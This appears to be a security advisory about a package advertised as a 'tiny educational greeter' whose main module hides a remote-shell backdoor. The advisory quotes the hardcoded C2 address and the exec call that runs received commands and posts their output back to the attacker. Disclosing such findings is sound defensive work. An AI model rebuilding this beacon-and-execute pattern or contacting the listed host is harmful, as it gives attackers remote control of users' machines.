summary: Remote-shell backdoor with C2 beacon to hardcoded IP on require()
details: The package is advertised as a 'tiny educational greeter' but its main module (index.js) contains a self-invoking IIFE that runs on every require/import. On load it sends the installer's hostname and process.platform to http://98.86.244.177:8080/register, then enters a polling loop against /beacon, executes any returned shell command via child_process.exec, and POSTs the stdout/stderr back to /results. The C2 endpoint is a bare IPv4 over plain HTTP and is hardcoded at index.js line 33 (`const C2 = "http://98.86.244.177:8080";`). The execution path is at index.js line 67 (`exec(CMD, (error, stdout, stderr) => {... httpRequest('POST', '/results', { output: OUT }); })`). This is full remote code execution and host enumeration on any machine that imports the package, gated only by network reachability to the attacker's IP. The package.json author is a placeholder ('Your Name <salman.ta12312@gmail.com>') and the 'educational greeter' description is a cover story for the embedded backdoor.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
